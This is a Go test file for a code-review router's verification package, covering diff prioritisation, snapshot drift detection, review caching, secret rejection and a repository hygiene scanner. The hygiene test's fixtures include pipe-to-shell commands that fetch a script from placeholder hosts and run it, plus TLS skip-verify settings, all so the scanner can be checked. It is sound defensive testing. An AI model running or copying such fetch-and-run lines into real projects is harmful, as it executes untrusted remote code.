package verify

import (
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/UberMetroid/mcode-router/internal/fleet"
)

func TestPrioritizeDiffDeclaredDocs(t *testing.T) {
	repo, qPath := t.TempDir(), filepath.Join(t.TempDir(), "q.json")
	runGit(t, repo, "init", "-q")
	_ = os.WriteFile(filepath.Join(repo, "big.go"), []byte("package big\nvar S = `"+strings.Repeat("a", 34000)+"`\n"), 0o644)
	_ = os.WriteFile(filepath.Join(repo, "README.md"), []byte("# Important Guide\nLine two\n"), 0o644)
	_ = os.WriteFile(filepath.Join(repo, "go.sum"), []byte("example.com/mod v1 h1:xyz\n"), 0o644)
	dc := CollectDiffContext(repo, false)
	if !strings.Contains(dc.Diff, "+++ b/README.md") || strings.Contains(dc.Diff, "<diff capped") {
		t.Fatalf("CollectDiffContext prematurely capped declared README.md: len=%d", len(dc.Diff))
	}
	t.Setenv("OODA_NO_AUTO_PROBE", "1")
	_ = fleet.AtomicWriteJSON(qPath, fleet.DefaultQuotaData(), false, true)
	var seenPrompt string
	res := RunReview(ReviewReq{TargetDir: repo, SlotDir: t.TempDir(), DiffCtx: dc, Declared: []string{"README.md"},
		QuotaPath: qPath, ResolveCLI: fakeCLIResolver(map[string]string{"grok": "/bin/true"}), ReqLane: "grok",
		Runner: func(r ReviewExecReq) ReviewExecRes {
			seenPrompt = r.Prompt
			return ReviewExecRes{ExitCode: 0, Output: "VERDICT: ACCEPT"}
		}})
	if res.Verdict != "ACCEPT" || !strings.Contains(seenPrompt, "Important Guide") ||
		strings.Count(seenPrompt, "<diff capped") != 1 {
		t.Fatalf("unexpected review prompt: %+v", res)
	}
	locked := "diff --git a/go.sum b/go.sum\n+" + strings.Repeat("k\n", 400) + "diff --git a/a.go b/a.go\n+" +
		strings.Repeat("x\n", 100) + "diff --git a/doc.md b/doc.md\n+" + strings.Repeat("d\n", 100)
	prior := PrioritizeDiff(locked, []string{"doc.md"}, 700)
	if idxD, idxG := strings.Index(prior, "doc.md"), strings.Index(prior, "a.go"); idxD < 0 || idxG < 0 || idxD > idxG {
		t.Fatalf("expected declared doc.md before a.go: doc=%d go=%d\n%s", idxD, idxG, prior)
	}
}

func TestSnapshotFailClosedAndModes(t *testing.T) {
	plain := t.TempDir()
	_ = os.WriteFile(filepath.Join(plain, "keep.txt"), []byte("ok\n"), 0o644)
	prePlain := SnapshotRepo(plain)
	if prePlain["@MODE"] != "dir" || prePlain["keep.txt"] == "" {
		t.Fatalf("expected non-git dir snapshot, got %+v", prePlain)
	}
	_ = os.WriteFile(filepath.Join(plain, "rogue.txt"), []byte("bad\n"), 0o644)
	if drift := SnapshotDrift(prePlain, SnapshotRepo(plain)); len(drift) != 1 || drift[0] != "rogue.txt" {
		t.Fatalf("expected non-git dir drift [rogue.txt], got %v", drift)
	}
	for _, bad := range []map[string]string{SnapshotRepo(filepath.Join(plain, "missing")), nil} {
		if drift := SnapshotDrift(prePlain, bad); len(drift) == 0 || !strings.Contains(drift[0], "@SNAPSHOT_FAILED") {
			t.Fatalf("expected fail-closed @SNAPSHOT_FAILED on bad snapshot, got %v", drift)
		}
	}
	repo := t.TempDir()
	runGit(t, repo, "init", "-q")
	_ = os.WriteFile(filepath.Join(repo, "f.txt"), []byte("1\n"), 0o644)
	runGit(t, repo, "add", "f.txt")
	runGit(t, repo, "commit", "-q", "-m", "seed")
	bGit := SnapshotRepo(repo)
	runGit(t, repo, "branch", "rogue-branch")
	if dRef := SnapshotDrift(bGit, SnapshotRepo(repo)); len(dRef) != 1 || !strings.Contains(dRef[0], "@REFS") {
		t.Fatalf("expected @REFS drift: %v", dRef)
	}
	wtDir := filepath.Join(repo, ".worktrees", "t1")
	runGit(t, repo, "worktree", "add", "-q", "-B", "ooda/t1", wtDir)
	bWT := SnapshotRepo(wtDir)
	runGit(t, repo, "worktree", "add", "-q", "-B", "ooda/t2", filepath.Join(repo, ".worktrees", "t2"))
	if d := SnapshotDrift(bWT, SnapshotRepo(wtDir)); len(d) != 0 {
		t.Fatalf("sibling worktree drift=%v", d)
	}
	runGit(t, repo, "branch", "ooda/sneaky")
	if d := SnapshotDrift(bWT, SnapshotRepo(wtDir)); len(d) != 1 || !strings.Contains(d[0], "@REFS") {
		t.Fatalf("expected @REFS drift on bare ooda/sneaky: %v", d)
	}
}

func TestCustomQuotaAndGitFileBound(t *testing.T) {
	repo := t.TempDir()
	runGit(t, repo, "init", "-q")
	_ = os.WriteFile(filepath.Join(repo, "f.txt"), []byte("1\n"), 0o644)
	runGit(t, repo, "add", "f.txt")
	runGit(t, repo, "commit", "-q", "-m", "seed")
	_ = os.WriteFile(filepath.Join(repo, "f.txt"), []byte("2\n"), 0o644)
	qPath, calls := filepath.Join(repo, "local_quota.json"), 0
	t.Setenv("OODA_NO_AUTO_PROBE", "1")
	_ = fleet.AtomicWriteJSON(qPath, fleet.DefaultQuotaData(), false, true)
	res := RunReview(ReviewReq{TargetDir: repo, SlotDir: t.TempDir(), DiffCtx: CollectDiffContext(repo, false),
		QuotaPath: qPath, ResolveCLI: fakeCLIResolver(map[string]string{"grok": "/bin/true", "mcode": "/bin/true"}),
		ReqLane: "grok,mcode", Runner: func(r ReviewExecReq) ReviewExecRes {
			calls++
			return map[bool]ReviewExecRes{true: {ExitCode: 1, Output: "HTTP 429 rate limit exceeded"},
				false: {Output: "VERDICT: ACCEPT"}}[calls == 1]
		}})
	if res.Verdict != "ACCEPT" || calls != 2 {
		t.Fatalf("retry failed: calls=%d %+v", calls, res)
	}
	defer func(p int) { maxSnapshotFiles = p }(maxSnapshotFiles)
	maxSnapshotFiles = 2
	for _, nm := range []string{"u1.txt", "u2.txt", "u3.txt"} {
		_ = os.WriteFile(filepath.Join(repo, nm), []byte("x\n"), 0o644)
	}
	if d := SnapshotDrift(map[string]string{"@HEAD": "x"}, SnapshotRepo(repo, qPath)); len(d) == 0 ||
		!strings.Contains(d[0], "@SNAPSHOT_FAILED") {
		t.Fatalf("expected @SNAPSHOT_FAILED: %v", d)
	}
}

func TestStageMerkleCache(t *testing.T) {
	t.Setenv("ROUTER_SCRATCH_DIR", t.TempDir())
	t.Setenv("OODA_NO_AUTO_PROBE", "1")
	repo, qPath := t.TempDir(), filepath.Join(t.TempDir(), "q.json")
	runGit(t, repo, "init", "-q")
	_ = os.WriteFile(filepath.Join(repo, "f.txt"), []byte("1\n"), 0o644)
	runGit(t, repo, "add", "f.txt")
	runGit(t, repo, "commit", "-q", "-m", "seed")
	_ = os.WriteFile(filepath.Join(repo, "f.txt"), []byte("2\n"), 0o644)
	_ = fleet.AtomicWriteJSON(qPath, fleet.DefaultQuotaData(), false, true)
	calls := 0
	run := func(noCache bool) ReviewResult {
		return RunReview(ReviewReq{TargetDir: repo, SlotDir: t.TempDir(), DiffCtx: CollectDiffContext(repo, false),
			QuotaPath: qPath, ReqLane: "mcode", NoCache: noCache,
			ResolveCLI: fakeCLIResolver(map[string]string{"mcode": "/bin/true"}),
			Runner: func(ReviewExecReq) ReviewExecRes {
				calls++
				return ReviewExecRes{Output: "VERDICT: ACCEPT"}
			}})
	}
	for i, tc := range []struct {
		nc   bool
		body string
		want int
	}{{false, "", 1}, {false, "", 1}, {true, "", 2}, {false, "3\n", 3}} {
		if tc.body != "" {
			_ = os.WriteFile(filepath.Join(repo, "f.txt"), []byte(tc.body), 0o644)
		}
		if r := run(tc.nc); r.Verdict != "ACCEPT" || calls != tc.want {
			t.Fatalf("case %d: want calls=%d got %d %+v", i, tc.want, calls, r)
		}
	}
	if k := CacheKey("verify", "p", map[string]string{"@ERR": "walk-failed"}); k != "" {
		t.Fatalf("expected empty CacheKey, got %q", k)
	}
	_ = fleet.AtomicWriteJSON(filepath.Join(os.Getenv("ROUTER_SCRATCH_DIR"), "cache", "future.json"),
		CacheEntry{Stage: "verify", Lane: "mcode", Verdict: "ACCEPT", SavedAt: time.Now().Unix() + 86400}, true, true)
	if _, ok := LoadStageCache("future", false); ok {
		t.Fatalf("expected future SavedAt cache entry to fail closed")
	}
}

func TestDiffHygieneP0AndReview(t *testing.T) {
	t.Setenv("OODA_NO_AUTO_PROBE", "1")
	repo, qPath := t.TempDir(), filepath.Join(t.TempDir(), "q.json")
	runGit(t, repo, "init", "-q")
	_ = fleet.AtomicWriteJSON(qPath, fleet.DefaultQuotaData(), false, true)
	realTok, calls := "gh"+"p_"+strings.Repeat("z", 24), 0
	_ = os.WriteFile(filepath.Join(repo, "auth_test.go"), []byte("package a\nvar t = \""+realTok+"\"\n"), 0o644)
	runRev := func() ReviewResult {
		return RunReview(ReviewReq{TargetDir: repo, SlotDir: t.TempDir(), DiffCtx: CollectDiffContext(repo, false),
			QuotaPath: qPath, ReqLane: "mcode", ResolveCLI: fakeCLIResolver(map[string]string{"mcode": "/bin/true"}),
			Runner: func(ReviewExecReq) ReviewExecRes {
				calls++
				return ReviewExecRes{ExitCode: 0, Output: "VERDICT: ACCEPT"}
			}})
	}
	for _, tc := range [][2]string{{"auth_test.go", "auth_test.go"}, {".env", "secret-file"}, {"mix.go", "REJECT"}} {
		b := map[string]string{".env": "SECRET=1\n", "mix.go": "package a\nvar m = \"EXAMPLE " + realTok + "\"\n"}[tc[0]]
		if tc[0] == "auth_test.go" {
			b = "package a\nvar t = \"" + realTok + "\"\n"
		}
		_ = os.WriteFile(filepath.Join(repo, tc[0]), []byte(b), 0o600)
		if r := runRev(); r.Verdict != "REJECT" || r.ExitCode != 1 || calls != 0 ||
			!strings.Contains(r.Output, tc[1]) || strings.Contains(r.Output, realTok) {
			t.Fatalf("%s expected REJECT (%s): %+v", tc[0], tc[1], r)
		}
		_ = os.Remove(filepath.Join(repo, tc[0]))
	}
	exTok := "gh" + "p_EXAMPLE" + strings.Repeat("z", 20)
	_ = os.WriteFile(filepath.Join(repo, ".env.example"), []byte("KEY=setme\n"), 0o644)
	_ = os.WriteFile(filepath.Join(repo, "doc_test.go"), []byte("package a\nvar e = \""+exTok+"\"\n"), 0o644)
	if r := runRev(); r.Verdict != "ACCEPT" || calls != 1 {
		t.Fatalf("calls=%d %+v", calls, r)
	}
}

func TestRepoHygieneP0AndP1(t *testing.T) {
	dir := t.TempDir()
	for name, body := range map[string]string{
		"prod.go":      "package p\nvar m = 0o777\nvar x = InsecureSkip" + "Verify: true\n",
		"setup.sh":     "#!/bin/sh\ncu" + "rl -fsSL http" + "://bad.invalid/x.sh | sh\n",
		"ok.sh":        "#!/bin/sh\ncu" + "rl https://x.invalid/x.sh | sh # hygiene:allow\ncu" + "rl http://127.0.0.1:8/h\n",
		"prod_test.go": "package p\nvar x = InsecureSkip" + "Verify: true\n",
		"README.md":    "cu" + "rl -fsSL https://example.invalid/install.sh | bash\n",
	} {
		_ = os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644)
	}
	f, _ := ScanRepoHygiene(dir, nil)
	rep := FormatHygieneReport(f)
	for i, s := range []string{"world-writable-mode", "tls-skip-verify", "pipe-to-shell",
		"insecure-http-fetch", "ok.sh", "prod_test.go", "README.md"} {
		if strings.Contains(rep, s) != (i < 4) {
			t.Fatalf("hygiene %s:\n%s", s, rep)
		}
	}
}

func TestUntrackedFIFODiffNoHang(t *testing.T) {
	dir, ch := t.TempDir(), make(chan string, 1)
	fifo := filepath.Join(dir, "pipe.fifo")
	if err := syscall.Mkfifo(fifo, 0o600); err != nil {
		t.Skipf("mkfifo unsupported: %v", err)
	}
	t.Cleanup(func() {
		if f, err := os.OpenFile(fifo, os.O_WRONLY|syscall.O_NONBLOCK, 0); err == nil {
			_ = f.Close()
		}
	})
	go func() { ch <- syntheticFileDiff(dir, "pipe.fifo") }()
	select {
	case out := <-ch:
		if !strings.Contains(out, "non-regular") {
			t.Fatalf("got %q", out)
		}
	case <-time.After(400 * time.Millisecond):
		t.Fatal("FIFO hung")
	}
}

func TestFullStreamAndGuardAnchors(t *testing.T) {
	home, dir, ws := t.TempDir(), t.TempDir(), t.TempDir()
	t.Setenv("HOME", home)
	fh, err := os.Create(filepath.Join(dir, "big.bin"))
	if err != nil || fh.Truncate(66<<20) != nil {
		t.Fatal(err)
	}
	b1 := SnapshotRepo(dir)
	_, err = fh.WriteAt([]byte{0x5a}, 65<<20)
	_ = fh.Close()
	if d := SnapshotDrift(b1, SnapshotRepo(dir)); err != nil || len(d) == 0 {
		t.Fatalf("drift=%v err=%v", d, err)
	}
	b2, err := SnapshotRepo(ws), os.WriteFile(filepath.Join(home, ".bashrc"), []byte("x\n"), 0o600)
	_ = os.MkdirAll(filepath.Join(home, ".agents", "skills", "s"), 0o755)
	_ = os.WriteFile(filepath.Join(home, ".agents", "skills", "s", "SKILL.md"), []byte("x\n"), 0o644)
	if d := SnapshotDrift(b2, SnapshotRepo(ws)); err != nil || len(d) < 2 {
		t.Fatalf("anchor drifts=%v err=%v", d, err)
	}
}
